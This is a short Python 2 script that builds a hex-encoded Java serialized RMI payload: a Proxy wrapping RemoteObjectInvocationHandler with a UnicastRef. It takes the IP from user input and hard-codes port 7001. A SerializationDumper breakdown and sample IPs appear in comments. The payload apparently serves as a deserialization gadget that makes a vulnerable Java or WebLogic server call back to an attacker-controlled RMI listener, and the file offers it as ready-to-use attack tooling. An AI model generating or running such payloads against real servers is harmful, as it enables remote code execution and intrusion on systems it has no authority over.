import sys

rmi_data = '''
aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707733
000a556e6963617374526566000c31302e31302e32302e313636044b0000000001eea90b00000000000000000000000000000078

java -jar SerializationDumper.jar aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707733000a556e6963617374526566000c31302e31302e32302e313636044b0000000001eea90b00000000000000000000000000000078

classdata
    java.rmi.server.RemoteObject
    values
    objectAnnotation
        TC_BLOCKDATA - 0x77
        Length - 51 - 0x33
        Contents - 0x000a556e6963617374526566000c31302e31302e32302e313636044b0000000001eea90b000000000000000000000000000000
        TC_ENDBLOCKDATA - 0x78
    java.rmi.server.RemoteObjectInvocationHandler
    values

'''



def rmi():
    s1 = 'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e030000787077'
    # ip = '31302e31302e32302e313636' #10.10.20.166
    # ip = '3130342e3235312e3232382e3530' # '104.251.228.50'.encode('hex') 
    ip1 = raw_input('\nIP= ')
    ip = ip1.encode('hex') 
    len_ip = '000' + hex(len(ip.decode('hex')))[2:] # 12  '000' + hex(len(ip.decode('hex')))[2:]
    # port = '044b' #1099 hex(1099)[0] + hex(1099)[2:]
    port = '1b59' #7001 hex(7001)[2:]
    s2 = '000a556e6963617374526566' +  len_ip + ip + '0000' + port + '0000000001eea90b000000000000000000000000000000'
    len1 = hex(len(s2.decode('hex')))[2:] # 33 
    print '\nLength= ' + len1
    rmi_data = '\n' + s1 + len1 + s2 + '78'
    print rmi_data
    print
    print "rmi://%s:7001" % (ip1)

if __name__ == '__main__':
    rmi()




